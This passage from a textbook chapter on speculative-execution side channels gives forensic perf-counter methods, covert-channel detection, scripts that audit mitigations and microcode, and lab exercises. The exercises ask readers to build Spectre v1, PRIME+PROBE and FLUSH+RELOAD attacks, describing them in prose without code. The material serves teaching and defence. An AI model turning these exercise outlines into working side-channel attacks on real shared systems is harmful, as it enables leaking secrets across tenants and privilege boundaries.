lscpu | grep "Thread(s) per core"
# If 1: SMT disabled at hypervisor level (strongest isolation)
# If 2: SMT enabled; verify core scheduling is active

# AWS: check Nitro hypervisor CPU isolation
# EC2 instances with dedicated tenancy disable cross-tenant SMT
curl -s http://169.254.169.254/latest/meta-data/placement/tenancy
# "dedicated" = single-tenant physical host

# GCP: verify per-VM core scheduling
# Confidential VMs (AMD SEV-SNP) provide hardware memory encryption
# plus hypervisor-enforced core isolation
gcloud compute instances describe $INSTANCE --format='value(confidentialInstanceConfig)'
```

---

## 12. Microarchitectural attack forensics

Investigating suspected microarchitectural attacks requires specialized techniques because the attacks operate below the OS visibility layer — they leave no filesystem artifacts, no network traces, and no traditional log entries. The primary evidence sources are hardware performance counters, timing anomalies, and process behavioral patterns.

### 12.1 Cache state reconstruction from performance counters

The goal is to reconstruct the cache access pattern of a suspected attacker process post-incident. While live cache state is volatile (lost on context switch), performance counter data can be captured continuously and analyzed retroactively.

**Continuous perf recording for forensic readiness:**

```bash
# Set up continuous recording with 1-second snapshots
# Captures cache events, branch mispredictions, and context switches
perf record -e cache-misses,cache-references,LLC-load-misses,LLC-loads,\
branch-misses,branches,context-switches \
-a -F 99 --switch-output=1m --overwrite -o /var/log/perf/forensic.data &

# Post-incident analysis: extract per-process cache statistics
perf report -i /var/log/perf/forensic.data.TIMESTAMP \
  --stdio --sort pid,comm -n --no-children \
  -e cache-misses

# Identify processes with anomalous LLC miss rates
perf script -i /var/log/perf/forensic.data.TIMESTAMP \
  -F pid,comm,event,period | \
  awk '/LLC-load-misses/ {miss[$1" "$2]+=$4}
       /LLC-loads/       {ref[$1" "$2]+=$4}
       END { for (k in miss) if (ref[k]>0)
         printf "%s ratio=%.3f misses=%d refs=%d\n",
                k, miss[k]/ref[k], miss[k], ref[k] }' | \
  sort -t= -k2 -rn | head -20
```

**Intel PEBS for precise attribution:**

```bash
# PEBS captures the exact instruction pointer causing cache misses
# Useful for identifying which code is performing probe array accesses
perf record -e cpu/event=0xd1,umask=0x20,precise=2/pp \
  -p $SUSPECT_PID -g -- sleep 30
# event 0xd1 umask 0x20 = MEM_LOAD_RETIRED.L3_MISS

perf report --stdio --sort sym,srcline
# Look for: high LLC miss count at array accesses with stride 4096
# (classic Spectre probe array pattern)
```

### 12.2 Timing channel evidence collection methodology

**Step 1 — Baseline establishment.** Before attributing anomalies, establish per-application performance baselines:

```bash
# Record 24-hour baseline for the target workload
perf stat -e cache-misses,cache-references,branch-misses,branches,\
instructions,cycles -a -I 60000 -o /var/log/perf/baseline_24h.csv -- sleep 86400

# Calculate statistical norms (mean, stddev, p99)
awk -F',' 'NR>1 {
    for(i=2;i<=NF;i++) {sum[i]+=$i; sumsq[i]+=$i*$i; n[i]++}
} END {
    for(i=2;i<=NF;i++) {
        mean=sum[i]/n[i]; stddev=sqrt(sumsq[i]/n[i]-mean*mean);
        printf "col%d: mean=%.2f stddev=%.2f p99=%.2f\n",
               i, mean, stddev, mean+2.576*stddev
    }
}' /var/log/perf/baseline_24h.csv
```

**Step 2 — Anomaly window extraction.** Isolate the time period showing anomalous behavior:

```bash
# Extract events during suspected attack window (UTC timestamps)
perf script -i /var/log/perf/forensic.data.TIMESTAMP \
  --time "2025-06-15 14:00:00,2025-06-15 14:30:00" \
  -F pid,tid,cpu,time,event,period,ip,sym > /evidence/attack_window.txt

# Correlate with process creation events (audit log)
ausearch -ts "06/15/2025" -te "06/15/2025" --start 14:00:00 --end 14:30:00 \
  -m EXECVE -i > /evidence/process_creation.txt
```

**Step 3 — Process behavioral fingerprinting:**

```bash
# strace the suspect process for syscall pattern analysis
# High-frequency mmap/munmap + clock_gettime = timing channel setup
strace -c -p $SUSPECT_PID -e trace=mmap,munmap,clock_gettime,\
perf_event_open,mprotect -o /evidence/syscall_profile.txt -- sleep 60

# Check for shared memory mappings to sensitive libraries
cat /proc/$SUSPECT_PID/maps | grep -E 'r--s.*\.(so|dll)' > /evidence/shared_maps.txt
# Shared read-only mappings to crypto libraries are Flush+Reload preconditions
```

### 12.3 Covert channel detection in shared infrastructure

Microarchitectural covert channels (Flush+Reload, Prime+Probe on shared LLC, memory-bus contention) can exfiltrate data between cooperating processes across VM boundaries. Detection focuses on identifying the synchronization pattern.

**Synchronized cache activity pattern:**

```bash
# Monitor two processes for correlated cache activity
# High temporal correlation between cache-miss bursts = covert channel
perf stat -e LLC-load-misses -I 100 -p $PID_A -o /tmp/pid_a_cache.csv &
perf stat -e LLC-load-misses -I 100 -p $PID_B -o /tmp/pid_b_cache.csv &
sleep 300
kill %1 %2

# Compute Pearson correlation between time series
python3 -c "
import csv, numpy as np
def load(f):
    vals = []
    with open(f) as fh:
        for r in csv.reader(fh):
            try: vals.append(float(r[1].strip().replace(',','')))
            except: pass
    return np.array(vals)
a, b = load('/tmp/pid_a_cache.csv'), load('/tmp/pid_b_cache.csv')
n = min(len(a), len(b))
corr = np.corrcoef(a[:n], b[:n])[0,1]
print(f'Pearson correlation: {corr:.4f}')
if abs(corr) > 0.7:
    print('WARNING: High correlation — possible covert channel')
"
```

### 12.4 Attribution challenges for microarchitectural attacks

Microarchitectural attacks present unique attribution difficulties:

- **No persistent artifacts.** Cache state, branch predictor state, and register file contents are volatile. Once the attacker process terminates or is context-switched, the direct evidence is gone.
- **Legitimate operation overlap.** Many attack indicators (high cache miss rates, frequent `clflush`, shared memory mappings) also occur in legitimate workloads (databases, JIT compilers, memory-mapped I/O).
- **Kernel-mediated indirection.** Spectre gadgets execute within the kernel or hypervisor — the attacker's user-space process triggers the gadget but the actual secret access occurs in a different privilege domain, making syscall-level attribution indirect.
- **Temporal precision requirements.** Attack windows measured in microseconds require nanosecond-resolution event correlation, which standard logging infrastructure (syslog, auditd) cannot provide.

**Forensic best practices:**

1. Deploy continuous `perf record` with `--switch-output` for rolling forensic buffers (retain 24-72 hours).
2. Enable `auditd` rules for `perf_event_open`, `mmap` with `MAP_SHARED`, and `prctl` with `PR_SET_TSC`.
3. Correlate perf counter anomalies with process lifecycle events (fork, exec, exit) within a 100ms window.
4. Preserve `/proc/$PID/maps`, `/proc/$PID/status`, and `/proc/$PID/smaps_rollup` snapshots for suspect processes before they terminate.
5. Timestamp all evidence in UTC ISO 8601. Hash forensic captures (SHA-256) immediately upon collection.

### 12.5 Forensic timeline construction

```bash
# Unified timeline: merge perf events, audit logs, and process data
# Output: timestamped event stream for incident reconstruction

# 1. Extract perf events with timestamps
perf script -i /var/log/perf/forensic.data.TIMESTAMP \
  -F time,pid,comm,event,ip,sym | \
  awk '{printf "PERF %s pid=%s comm=%s event=%s ip=%s sym=%s\n",
        $1, $2, $3, $4, $5, $6}' > /evidence/timeline_perf.txt

# 2. Extract audit events
ausearch --raw -ts recent | \
  awk -F'[=:]' '/^type=SYSCALL/{
    for(i=1;i<=NF;i++){
      if($i~"pid") pid=$(i+1);
      if($i~"comm") comm=$(i+1);
      if($i~"syscall") sc=$(i+1);
    }
    print "AUDIT", strftime("%H:%M:%S.000", systime()), "pid="pid, "comm="comm, "syscall="sc
  }' > /evidence/timeline_audit.txt

# 3. Merge and sort by timestamp
cat /evidence/timeline_perf.txt /evidence/timeline_audit.txt | \
  sort -k2 > /evidence/timeline_unified.txt

# 4. Highlight anomaly clusters (>5 cache events per 100ms window)
awk '{
    t = $2; sub(/\..*/, "", t);
    window[t]++;
    if (window[t] == 5) print ">>> CLUSTER START at " t;
    lines[NR] = $0;
} END {
    for (i=1; i<=NR; i++) print lines[i]
}' /evidence/timeline_unified.txt > /evidence/timeline_annotated.txt
```

---

## 13. Mitigation deployment and verification

Deploying speculative execution mitigations across a production fleet requires systematic verification: confirming that the correct mitigations are active for each CPU model, measuring performance impact, and identifying coverage gaps in heterogeneous environments.

### 13.1 Kernel mitigation status audit

The `/sys/devices/system/cpu/vulnerabilities/` directory exposes the kernel's assessment of each vulnerability and the active mitigation. This script parses and evaluates all entries:

```bash
#!/bin/bash
# mitigation_audit.sh — Comprehensive speculative execution mitigation audit
# Run as root on each host. Output: structured report.

set -euo pipefail

VULN_DIR="/sys/devices/system/cpu/vulnerabilities"
HOSTNAME=$(hostname -f)
CPU_MODEL=$(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2 | xargs)
MICROCODE=$(grep -m1 'microcode' /proc/cpuinfo | cut -d: -f2 | xargs)
KERNEL=$(uname -r)

echo "=== Mitigation Audit Report ==="
echo "Host:       $HOSTNAME"
echo "CPU:        $CPU_MODEL"
echo "Microcode:  $MICROCODE"
echo "Kernel:     $KERNEL"
echo "Date:       $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""

CRITICAL=0
WARN=0
OK=0

for vuln_file in "$VULN_DIR"/*; do
    vuln_name=$(basename "$vuln_file")
    status=$(cat "$vuln_file")

    severity="OK"
    if echo "$status" | grep -qi "vulnerable"; then
        severity="CRITICAL"
        ((CRITICAL++))
    elif echo "$status" | grep -qi "not affected"; then
        severity="OK"
        ((OK++))
    elif echo "$status" | grep -qi "mitigation"; then
        severity="OK"
        ((OK++))
    elif echo "$status" | grep -qi "unknown"; then
        severity="WARN"
        ((WARN++))
    else
        severity="WARN"
        ((WARN++))
    fi

    printf "%-35s [%s] %s\n" "$vuln_name" "$severity" "$status"
done

echo ""
echo "Summary: OK=$OK WARN=$WARN CRITICAL=$CRITICAL"

if [ "$CRITICAL" -gt 0 ]; then
    echo "ACTION REQUIRED: $CRITICAL unmitigated vulnerabilities detected."
    exit 2
elif [ "$WARN" -gt 0 ]; then
    echo "REVIEW: $WARN vulnerabilities with unknown or partial mitigation."
    exit 1
else
    echo "All known speculative execution vulnerabilities are mitigated."
    exit 0
fi
```

**Expected output interpretation:**

| Vulnerability file | Healthy status | Concern |
|---|---|---|
| `spectre_v1` | `Mitigation: usercopy/swapgs barriers and __user pointer sanitization` | "Vulnerable" = missing kernel patches |
| `spectre_v2` | `Mitigation: Enhanced IBRS + BHI_DIS_S` or `Retpolines + IBPB` | Missing eIBRS on capable CPU = misconfiguration |
| `meltdown` | `Not affected` (Ice Lake+) or `Mitigation: PTI` | "Vulnerable" = KPTI disabled |
| `spec_store_bypass` | `Mitigation: Speculative Store Bypass disabled via prctl` | "Vulnerable" = SSBD not available |
| `retbleed` | `Mitigation: untrained return thunk` (AMD) or `Enhanced IBRS` | "Vulnerable" on affected CPU = urgent |
| `spec_rstack_overflow` | `Mitigation: Safe RET` | "Vulnerable" on Zen 3/4 = urgent |
| `gather_data_sampling` | `Mitigation: Microcode` or `Not affected` | "Vulnerable" on 6-11th gen Intel = urgent |

### 13.2 Firmware and microcode update verification

```bash
# Intel microcode version check
CURRENT_UCODE=$(grep -m1 'microcode' /proc/cpuinfo | awk '{print $NF}')
echo "Current microcode: $CURRENT_UCODE"

# Compare against known-good versions (source: Intel microcode guidance)
# Update this table per Intel's quarterly releases
declare -A REQUIRED_UCODE=(
    ["06-8e-09"]="0xf4"   # Kaby Lake H/S/X
    ["06-8e-0a"]="0xf4"   # Coffee Lake U
    ["06-9e-09"]="0xf4"   # Kaby Lake desktop
    ["06-9e-0a"]="0xf4"   # Coffee Lake S
    ["06-9e-0d"]="0xf8"   # Coffee Lake H
    ["06-a5-03"]="0xf8"   # Comet Lake S
    ["06-a6-01"]="0xf8"   # Comet Lake U
    ["06-8c-01"]="0xac"   # Tiger Lake U
    ["06-8d-01"]="0x4c"   # Tiger Lake H
    ["06-97-02"]="0x32"   # Alder Lake S
    ["06-9a-03"]="0x433"  # Alder Lake P
)

CPU_SIGNATURE=$(grep -m1 'cpu family' /proc/cpuinfo | awk '{print $NF}')
CPU_MODEL_NUM=$(grep -m1 'model[^a-z]' /proc/cpuinfo | awk '{print $NF}')
CPU_STEPPING=$(grep -m1 'stepping' /proc/cpuinfo | awk '{print $NF}')
CPUID_KEY=$(printf "06-%02x-%02x" "$CPU_MODEL_NUM" "$CPU_STEPPING")

if [[ -v "REQUIRED_UCODE[$CPUID_KEY]" ]]; then
    REQUIRED="${REQUIRED_UCODE[$CPUID_KEY]}"
    if [[ "$CURRENT_UCODE" < "$REQUIRED" ]]; then
        echo "WARNING: Microcode $CURRENT_UCODE is below required $REQUIRED for $CPUID_KEY"
        echo "Update via: apt install intel-microcode (Debian/Ubuntu)"
        echo "            dnf install microcode_ctl (RHEL/Fedora)"
    else
        echo "Microcode is current for $CPUID_KEY (required: $REQUIRED)"
    fi
else
    echo "CPUID $CPUID_KEY not in known-good table — verify manually"
fi

# AMD microcode version check
if grep -q 'AMD' /proc/cpuinfo; then
    AMD_UCODE=$(grep -m1 'microcode' /proc/cpuinfo | awk '{print $NF}')
    echo "AMD microcode: $AMD_UCODE"
    # AMD does not publish per-stepping requirements as granularly;
    # verify against linux-firmware changelog:
    dpkg -l | grep amd64-microcode || rpm -qa | grep linux-firmware
fi
```

### 13.3 Performance impact measurement methodology

Mitigation performance impact must be measured empirically. Theoretical estimates vary widely by workload; only A/B benchmarking provides actionable data.

```bash
#!/bin/bash
# mitigation_perf_impact.sh — Before/after benchmark for mitigation overhead
# Usage: ./mitigation_perf_impact.sh <benchmark_command>

BENCHMARK="${1:?Usage: $0 <benchmark_command>}"
RESULTS_DIR="/var/log/mitigation-benchmarks/$(date -u +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS_DIR"

echo "=== Mitigation Performance Impact Test ==="
echo "Benchmark: $BENCHMARK"
echo "Results:   $RESULTS_DIR"

# Phase 1: Benchmark with full mitigations (current state)
echo ""
echo "--- Phase 1: Full mitigations (current) ---"
cat /sys/devices/system/cpu/vulnerabilities/* > "$RESULTS_DIR/mitigations_on.txt"
perf stat -e instructions,cycles,cache-misses,cache-references,\
branch-misses,branches,task-clock -r 5 -- $BENCHMARK \
  2> "$RESULTS_DIR/perf_mitigations_on.txt"

echo "Phase 1 complete. Results in $RESULTS_DIR/perf_mitigations_on.txt"
echo ""
echo "--- Phase 2 requires booting with mitigations=off ---"
echo "To complete the comparison:"
echo "  1. Add 'mitigations=off' to GRUB_CMDLINE_LINUX"
echo "  2. Reboot"
echo "  3. Run: perf stat -e instructions,cycles,cache-misses,\\"
echo "     cache-references,branch-misses,branches,task-clock \\"
echo "     -r 5 -- $BENCHMARK 2> $RESULTS_DIR/perf_mitigations_off.txt"
echo "  4. Restore mitigations and reboot"
echo ""
echo "Compare results:"
echo "  paste $RESULTS_DIR/perf_mitigations_on.txt \\"
echo "        $RESULTS_DIR/perf_mitigations_off.txt | column -t"

# Automated comparison (if both files exist)
if [ -f "$RESULTS_DIR/perf_mitigations_off.txt" ]; then
    echo ""
    echo "--- Comparison ---"
    python3 -c "
import re, sys
def parse_perf(f):
    d = {}
    with open(f) as fh:
        for line in fh:
            m = re.match(r'\s*([\d,]+)\s+(\S+)', line)
            if m:
                d[m.group(2)] = int(m.group(1).replace(',',''))
    return d
on  = parse_perf('$RESULTS_DIR/perf_mitigations_on.txt')
off = parse_perf('$RESULTS_DIR/perf_mitigations_off.txt')
print(f'{\"Metric\":<30} {\"Mitigations ON\":>15} {\"Mitigations OFF\":>15} {\"Overhead\":>10}')
print('-'*75)
for k in on:
    if k in off and off[k] > 0:
        overhead = ((on[k] - off[k]) / off[k]) * 100
        print(f'{k:<30} {on[k]:>15,} {off[k]:>15,} {overhead:>+9.1f}%')
"
fi
```

**Typical mitigation overhead ranges (empirical):**

| Mitigation | Workload type | Typical overhead |
|---|---|---|
| KPTI | Syscall-heavy (databases, web servers) | 5-30% |
| Retpoline | Indirect-branch-heavy (virtual dispatch) | 2-10% |
| eIBRS | General | <1% (hardware-assisted) |
| SSBD | Store-heavy | 2-8% |
| Retbleed unret | Syscall-heavy (AMD) | 5-15% |
| IBPB on context switch | Multi-tenant, high context switch rate | 10-25% |
| GDS microcode | AVX-heavy (ML, crypto, HPC) | 0-50% |
| L1D flush on VM entry | VM-heavy hypervisors | 3-15% |
| MDS full | General | 1-5% |

### 13.4 Cloud workload isolation verification

```bash
# Verify SMT isolation for sensitive workloads
# Option 1: Disable SMT entirely
cat /sys/devices/system/cpu/smt/active
# 0 = SMT disabled (strongest isolation, ~30% throughput loss)

# Option 2: Core scheduling (Linux 5.14+)
cat /proc/sys/kernel/sched_core_enabled
# 1 = core scheduling active (sibling threads share trust domain)

# Verify PCID support (reduces KPTI TLB flush overhead)
grep -o 'pcid' /proc/cpuinfo | head -1
# "pcid" = Process-Context Identifiers supported
# KPTI with PCID: ~2-5% overhead vs. ~20-30% without PCID

# Verify L1D flush on VM entry (KVM)
cat /sys/module/kvm/parameters/l1d_flush
# Y = L1D cache flushed on every VM entry (L1TF mitigation)

# Verify CPU pinning (prevents cross-core cache contention)
taskset -p $PID
# Output shows CPU affinity mask

# Kubernetes: verify CPU manager policy
kubectl get nodes -o json | jq '.items[].status.allocatable["cpu"]'
# For isolation: kubelet --cpu-manager-policy=static
# Verify: cat /var/lib/kubelet/cpu_manager_state

# cgroup cpuset verification (container isolation)
cat /sys/fs/cgroup/cpuset/docker/$CONTAINER_ID/cpuset.cpus
# Should show dedicated cores, not shared
```

### 13.5 Mitigation coverage gap analysis for heterogeneous CPU fleets

In production environments with multiple CPU generations, each generation requires different mitigations. A single kernel boot parameter set may leave gaps.

```bash
#!/bin/bash
# fleet_mitigation_gaps.sh — Identify mitigation gaps across CPU generations
# Run on each host; aggregate results centrally.

set -euo pipefail

HOSTNAME=$(hostname -f)
CPU_FAMILY=$(awk -F: '/cpu family/{print $2; exit}' /proc/cpuinfo | xargs)
CPU_MODEL=$(awk -F: '/^model[^a-z]/{print $2; exit}' /proc/cpuinfo | xargs)
CPU_STEPPING=$(awk -F: '/stepping/{print $2; exit}' /proc/cpuinfo | xargs)
VENDOR=$(awk -F: '/vendor_id/{print $2; exit}' /proc/cpuinfo | xargs)
MICROCODE=$(awk -F: '/microcode/{print $2; exit}' /proc/cpuinfo | xargs)

echo "HOST=$HOSTNAME VENDOR=$VENDOR FAMILY=$CPU_FAMILY MODEL=$CPU_MODEL \
STEPPING=$CPU_STEPPING MICROCODE=$MICROCODE"

GAPS=""

# Intel-specific checks
if [[ "$VENDOR" == *"Intel"* ]]; then
    # Skylake through Coffee Lake (model 78, 94, 142, 158): need retpoline + IBRS
    if [[ "$CPU_MODEL" =~ ^(78|94|142|158)$ ]]; then
        V2=$(cat /sys/devices/system/cpu/vulnerabilities/spectre_v2)
        if ! echo "$V2" | grep -q "IBRS\|eIBRS\|Retpolines"; then
            GAPS="$GAPS spectre_v2:MISSING_IBRS_OR_RETPOLINE"
        fi
    fi

    # 6th-11th gen: need GDS microcode
    if [[ "$CPU_MODEL" =~ ^(78|94|142|158|165|166|140|141)$ ]]; then
        GDS=$(cat /sys/devices/system/cpu/vulnerabilities/gather_data_sampling 2>/dev/null || echo "N/A")
        if echo "$GDS" | grep -qi "vulnerable"; then
            GAPS="$GAPS gds:VULNERABLE_NEEDS_MICROCODE"
        fi
    fi

    # Alder Lake+: need BHI_DIS_S
    if [[ "$CPU_MODEL" =~ ^(151|154|183|186)$ ]]; then
        V2=$(cat /sys/devices/system/cpu/vulnerabilities/spectre_v2)
        if ! echo "$V2" | grep -q "BHI_DIS_S\|BHI: SW loop"; then
            GAPS="$GAPS native_bhi:MISSING_BHI_MITIGATION"
        fi
    fi
fi

# AMD-specific checks
if [[ "$VENDOR" == *"AMD"* ]]; then
    # Zen 1/2 (family 23): need retbleed mitigation
    if [[ "$CPU_FAMILY" == "23" ]]; then
        RB=$(cat /sys/devices/system/cpu/vulnerabilities/retbleed)
        if echo "$RB" | grep -qi "vulnerable"; then
            GAPS="$GAPS retbleed:VULNERABLE_NEEDS_UNTRAIN_OR_IBPB"
        fi
    fi

    # Zen 2 (family 23, model 49/71/96/113/144): need Zenbleed fix
    if [[ "$CPU_FAMILY" == "23" ]] && [[ "$CPU_MODEL" =~ ^(49|71|96|113|144)$ ]]; then
        # No dedicated sysfs entry; check microcode version
        echo "NOTE: Zen 2 CPU — verify Zenbleed microcode manually"
        GAPS="$GAPS zenbleed:VERIFY_MICROCODE"
    fi

    # Zen 3/4 (family 25/26): need SRSO/Inception mitigation
    if [[ "$CPU_FAMILY" =~ ^(25|26)$ ]]; then
        SRSO=$(cat /sys/devices/system/cpu/vulnerabilities/spec_rstack_overflow 2>/dev/null || echo "N/A")
        if echo "$SRSO" | grep -qi "vulnerable"; then
            GAPS="$GAPS srso:VULNERABLE_NEEDS_SAFE_RET"
        fi
    fi
fi

if [ -z "$GAPS" ]; then
    echo "STATUS=OK GAPS=none"
else
    echo "STATUS=GAPS_FOUND GAPS=$GAPS"
fi
```

**Fleet aggregation:** Collect the output from all hosts via configuration management (Ansible, Puppet, Salt) or a monitoring agent, then aggregate by CPU model to identify which generations require remediation:

```bash
# Ansible one-liner to audit entire fleet
ansible all -m script -a "fleet_mitigation_gaps.sh" | \
  grep "STATUS=GAPS_FOUND" | sort | uniq -c | sort -rn

# Expected output format:
#   15 STATUS=GAPS_FOUND GAPS= gds:VULNERABLE_NEEDS_MICROCODE
#    3 STATUS=GAPS_FOUND GAPS= retbleed:VULNERABLE_NEEDS_UNTRAIN_OR_IBPB
#    1 STATUS=GAPS_FOUND GAPS= srso:VULNERABLE_NEEDS_SAFE_RET
```

---

## 14. Cross-references

**To Domain 2:** KPTI (Chapter 2A §10.3) is the Meltdown mitigation. `prctl` (Chapter 2C §2) controls SSBD per-process. Seccomp (Chapter 2B §3) interacts with SSBD via the `seccomp` mode. The vDSO (Chapter 2A §6) provides `clock_gettime` as an alternative timing source when `rdtsc` is restricted.

**To Domain 5:** Spectre side channels can be used for KASLR bypass (Chapter 5A §7.4) — measuring speculative access timing to determine which kernel addresses are mapped. The eBPF verifier (Chapter 5B §4) must account for speculative execution: a verifier-accepted BPF program that is safe architecturally may leak data speculatively. The prefetch-based KASLR bypass (§8.4 above) demonstrates that address-space randomization is insufficient against microarchitectural probing.

**To Chapter 7B:** SGX enclaves are a primary target for cache-based and branch-predictor side channels (the enclave's secret data can be inferred from its cache/branch access pattern). Rowhammer provides a fault-injection channel that interacts with speculative execution (DRAM-level bit flips can corrupt page tables, enabling Meltdown-style attacks). The hardware attacks in 7B (Downfall, Zenbleed, Inception, etc.) are architectural vulnerabilities that extend the speculative-execution attack taxonomy. L1 Terminal Fault (Foreshadow) is the Meltdown-P variant, fully detailed in Chapter 7B §1.

---

## 15. Key references

1. Kocher, P. et al. "Spectre Attacks: Exploiting Speculative Execution." S&P 2019 (originally disclosed January 2018). CVE-2017-5753 (v1), CVE-2017-5715 (v2).
2. Lipp, M. et al. "Meltdown: Reading Kernel Memory from User Space." USENIX Security 2018. CVE-2017-5754.
3. Canella, C. et al. "A Systematic Evaluation of Transient Execution Attacks and Defenses." USENIX Security 2019. Meltdown variant taxonomy.
4. Koruyeh, E.M. et al. "Spectre Returns! Speculation Attacks using the Return Stack Buffer." WOOT 2018. SpectreRSB.
5. Wikner, D. et al. "Branch History Injection: On the Effectiveness of Hardware Mitigations Against Cross-Privilege Spectre-v2 Attacks." USENIX Security 2022. CVE-2022-0001, CVE-2022-0002.
6. Yarom, Y. and Falkner, K. "FLUSH+RELOAD: A High Resolution, Low Noise, L3 Cache Side-Channel Attack." USENIX Security 2014.
7. Liu, F. et al. "Last-Level Cache Side-Channel Attacks are Practical." S&P 2015. Group-testing eviction-set construction.
8. Gruss, D. et al. "Flush+Flush: A Fast and Stealthy Cache Attack." DIMVA 2016.
9. Gras, B. et al. "Translation Leak-aside Buffer: Defeating Cache Side-channel Protections with TLB Attacks." USENIX Security 2018. TLBleed.
10. Aldaya, A.C. et al. "Port Contention for Fun and Profit." S&P 2019. SMT port-contention key extraction.
11. Gruss, D. et al. "Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR." CCS 2016. Prefetch-based KASLR bypass.
12. Van Bulck, J. et al. "SGX-Step: A Practical Attack Framework for Precise Enclave Execution Control." SysTEX 2017. Interrupt-timing single-stepping.
13. Turner, P. "Retpoline: A software construct for preventing branch-target-injection." Google, January 2018.
14. Intel Corporation. "Speculative Execution Side Channel Mitigations." Revision 4.0, May 2018. IBRS/IBPB/STIBP specification.
15. Evtyushkin, D. et al. "BranchScope: A New Side-Channel Attack on Directional Branch Predictor." ASPLOS 2018.
16. Pessl, P. et al. "DRAMA: Exploiting DRAM Addressing for Cross-CPU Attacks." USENIX Security 2016. DRAM row-buffer side channels.
17. Maurice, C. et al. "Reverse Engineering Intel Last-Level Cache Complex Addressing Using Performance Counters." RAID 2015. LLC slice hash.
18. Mcilroy, R. et al. "Spectre is here to stay: An analysis of side-channels and speculative execution." arXiv:1902.05178, 2019. Formal Spectre gadget model.
19. Schwarz, M. et al. "NetSpectre: Read Arbitrary Memory over Network." ESORICS 2019. Remote Spectre exploitation.
20. Xu, Y. et al. "Controlled-Channel Attacks: Deterministic Side Channels for Untrusted Operating Systems." S&P 2015.
21. Wu, Z. et al. "Whispers in the Hyper-space: High-bandwidth and Reliable Covert Channel Attacks inside the Cloud." IEEE/ACM Transactions on Networking, 2014.
22. Ge, Q. et al. "A Survey of Microarchitectural Timing Attacks and Countermeasures on Contemporary Hardware." Journal of Cryptographic Engineering, 2018.

---

## Exercises

Hands-on exercises for this chapter. For guided lab walkthroughs see `tutorials/tutorial_domain7_ch7A_spectre_lab.md`.

1. **Spectre v1 PoC with tuned FLUSH+RELOAD.** Compile the Spectre v1 PoC from §2.2 with `gcc -O1 -march=native`. (a) Calibrate `CACHE_HIT_THRESHOLD` for your CPU by measuring L1 hit vs. DRAM miss latency over 10,000 samples using `rdtscp`. (b) Run the PoC and measure leak bandwidth (bytes/second). (c) Modify the probe array stride from 512 to 4096 bytes and compare leak reliability — explain why page-aligned strides improve signal-to-noise ratio. (d) Insert an `lfence` after the bounds check in `victim_function` and confirm the leak is blocked. (e) Replace the `lfence` with `array_index_nospec` masking and verify equivalent protection with lower overhead.

2. **PRIME+PROBE eviction-set construction.** Write a C program that constructs an LLC eviction set for a target address using the group-testing algorithm (§7.2). (a) Allocate a 64MB buffer with `mmap(MAP_HUGETLB)` for physical-address-contiguous memory. (b) Implement the naive O(n^2) algorithm first, measuring construction time. (c) Implement the group-testing O(n) algorithm and compare construction time. (d) Verify your eviction set by measuring the target's reload time after eviction — it should exceed `CACHE_HIT_THRESHOLD`. (e) On a multi-core system, test whether your eviction set works cross-core (it should, since the LLC is shared).

3. **Retpoline verification and performance measurement.** (a) Compile a kernel module containing an indirect `call` instruction with and without `-mindirect-branch=thunk`. Disassemble both versions with `objdump` and identify the retpoline thunk. (b) Write a microbenchmark that measures the throughput of 10 million indirect calls through the retpoline thunk vs. a bare `call [rax]`. (c) Check your kernel's Spectre v2 mitigation status via `/sys/devices/system/cpu/vulnerabilities/spectre_v2` and document whether eIBRS or retpoline is active. (d) If eIBRS is active, measure whether retpoline is still used for module-to-module indirect calls (cross-DSO) using `objtool` output.

4. **Cache-timing covert channel.** Build a FLUSH+RELOAD covert channel between two cooperating processes. (a) The sender process maps a shared library and encodes bits by accessing (bit=1) or not accessing (bit=0) a specific cache line. (b) The receiver process uses `clflush` + `rdtscp` to probe the cache line and decode bits. (c) Measure bandwidth (KB/s) and error rate over a 1KB message. (d) Add 1-bit repetition coding (send each bit 3 times, majority vote) and measure the error-rate improvement. (e) Test whether `prctl(PR_SET_TSC, PR_TSC_SIGSEGV)` on the receiver breaks the channel, and implement a counting-thread timer fallback.

5. **Training Solo / Branch Privilege Injection assessment.** (a) Check your CPU's vulnerability to CVE-2024-45332 (Branch Privilege Injection) by reading `/sys/devices/system/cpu/vulnerabilities/spectre_v2` and `dmesg | grep -i spectre`. (b) Check for CVE-2024-28956 and CVE-2025-24495 (Training Solo) microcode mitigations by examining `cpuid` output for `BHI_NO`, `BHI_DIS_S`, and `RRSBA_DIS` bits. (c) Document your kernel's BHB clearing sequence length (search `dmesg` for `spectre_bhi` or read `arch/x86/include/asm/nospec-branch.h` for `BHB_MITIGATION_LOOPS`). (d) If your CPU is an Intel 9th-gen or later, assess whether the Branch Privilege Injection race condition is mitigated by your current microcode version. (e) Write a one-page risk assessment: given your system's hardware generation, microcode, and kernel version, which Spectre variants remain exploitable and at what leak bandwidth?

---

## Readings and References

(retrieved: 2026-05-29)

*Note: References 1–22 above are the chapter's primary academic references. The following supplement with recent developments, tools, and ATT&CK mappings.*

23. VUSec. "Training Solo: Self-Training Spectre-v2 Attacks." May 2025. CVE-2024-28956, CVE-2025-24495. https://www.vusec.net/projects/training-solo/
24. ETH Zurich Computer Security Group. "Branch Privilege Injection." May 2025. CVE-2024-45332. https://comsec.ethz.ch/research/microarch/branch-privilege-injection/
25. AMD. "Transient Scheduler Attacks (TSA)." July 2025. AMD-SB-7037. https://www.amd.com/en/resources/product-security.html
26. Linux kernel documentation — Spectre mitigations. https://docs.kernel.org/admin-guide/hw-vuln/spectre.html
27. MITRE ATT&CK T1203 — Exploitation for Client Execution. https://attack.mitre.org/techniques/T1203/
28. MITRE ATT&CK T1055 — Process Injection (side-channel-assisted payload targeting). https://attack.mitre.org/techniques/T1055/
29. Intel Corporation. "Affected Processors: Transient Execution Attacks." Updated 2025. https://www.intel.com/content/www/us/en/developer/topic-technology/software-security-guidance/processors-affected-consolidated-product-cpu-model.html
30. Canella, C. et al. "A Systematic Evaluation of Transient Execution Attacks and Defenses." USENIX Security 2019. Meltdown variant taxonomy. https://www.usenix.org/conference/usenixsecurity19/presentation/canella
31. Wikner, D. et al. "Branch History Injection." USENIX Security 2022. CVE-2022-0001, CVE-2022-0002. https://www.usenix.org/conference/usenixsecurity22/presentation/barberis
32. Intel. "Speculative Execution Side Channel Mitigations." Rev. 4.0, May 2018. IBRS/IBPB/STIBP specification. https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/speculative-execution-side-channel-mitigations.html

---

## Cross-References

